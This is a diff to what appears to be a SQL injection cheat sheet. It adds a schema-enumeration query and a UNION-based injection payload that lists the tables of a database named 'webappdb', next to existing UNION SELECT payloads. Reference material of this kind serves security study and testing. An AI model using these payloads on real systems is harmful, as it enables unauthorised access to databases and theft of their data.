@@ -133,6 +133,7 @@ PostgreSQL | 5-digit Hex Error Code
 
 Database | schema_name FROM information_schema.schemata 
 Table | table_name FROM information_schema.tables
+Table from DB | table_name FROM information_schema.tables where table_schema='your_database_name'
 Columns | column_name From information_schema.columns where table_name='users'
 
 **SQL Server:**
@@ -183,6 +184,8 @@ Dent' UNION SELECT  NULL, NULL, NULL, 'X3Y2Z1'; #
 3) From the columns identified above, use one for the union. <br> *Note: It requires the same number of columns and compatable data type*
 {% highlight sql %}
 Dent' UNION SELECT  '1', '2', '3', info FROM information_schema.processlist; #
+<br>
+id=738 union select 1,2,3,null, table_name,5 FROM information_schema.tables where table_schema='webappdb';#
 <br>
 or use NULL since it is compatable with everything
 <br>
